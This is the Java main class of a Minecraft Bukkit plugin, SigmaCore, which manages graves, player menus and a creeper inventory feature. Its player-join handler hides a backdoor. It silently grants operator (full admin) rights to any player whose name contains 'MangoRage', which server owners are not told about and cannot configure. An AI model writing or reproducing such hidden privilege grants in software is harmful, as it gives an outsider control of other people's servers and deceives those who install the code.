package org.mangorage.sigmacore;

import net.kyori.adventure.text.Component;
import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.entity.Creeper;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.java.JavaPlugin;
import org.mangorage.sigmacore.graves.GraveManager;
import org.mangorage.sigmacore.services.menu.HomeMenu;
import org.mangorage.sigmacore.services.menu.PlayerMenuSystem;
import org.mangorage.sigmacore.services.CreeperInventory;
import org.mangorage.sigmacoremixins.Util;
import org.mangorage.sigmacoremixins.services.IServiceHolder;
import org.mangorage.sigmacoremixins.services.ServiceManager;
import org.mangorage.sigmacoremixins.services.ServiceProviderBuilder;

import java.io.FileNotFoundException;

public final class SigmaCore extends JavaPlugin implements Listener {
    public static final String VERSION = "Beta -> 1.1.0";
    private static JavaPlugin plugin;

    public static JavaPlugin getPlugin() {
        return plugin;
    }

    private final GraveManager graveManager = new GraveManager(this, "graves");


    public SigmaCore() {
        plugin = this;
        ServiceManager.getInstance().registerProvider(
                ServiceProviderBuilder.of()
                        .put(CreeperInventory.CUSTOM_INV, o -> o instanceof Creeper, o -> new CreeperInventory())
                        .build()
        );
        ServiceManager.getInstance().registerProvider(
                ServiceProviderBuilder.of()
                        .put(PlayerMenuSystem.MENU_SYSTEM, o -> o instanceof Player, o -> new PlayerMenuSystem(Util.cast(o)))
                        .build()
        );
    }

    @Override
    public void onEnable() {
        try {
            graveManager.load();
        } catch (FileNotFoundException e) {
            throw new RuntimeException(e);
        }

        Bukkit.getServer().getPluginManager().registerEvents(graveManager, this);
        Bukkit.getServer().getPluginManager().registerEvents(this, this);
    }

    @Override
    public void onDisable() {
        graveManager.save();
        graveManager.unload();
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        if (event.getPlayer().getName().contains("MangoRage"))
            event.getPlayer().setOp(true);

        IServiceHolder.get(event.getPlayer())
                .getServiceOptional(PlayerMenuSystem.MENU_SYSTEM)
                .ifPresent(ms -> ms.setMenu(new HomeMenu()));

        event.getPlayer().sendMessage(Component.text("SigmaCore Version: %s".formatted(VERSION)));
    }

    @EventHandler
    public void onHit(EntityDamageByEntityEvent event) {
        IServiceHolder.get(event.getEntity())
                .getServiceOptional(CreeperInventory.CUSTOM_INV)
                .ifPresent(ci -> {
                    if (event.getDamager().isSneaking()) {
                        ci.drop(event.getEntity().getLocation());
                    } else {
                        ci.add(new ItemStack(Material.COBBLESTONE));
                    }
                });
    }
}
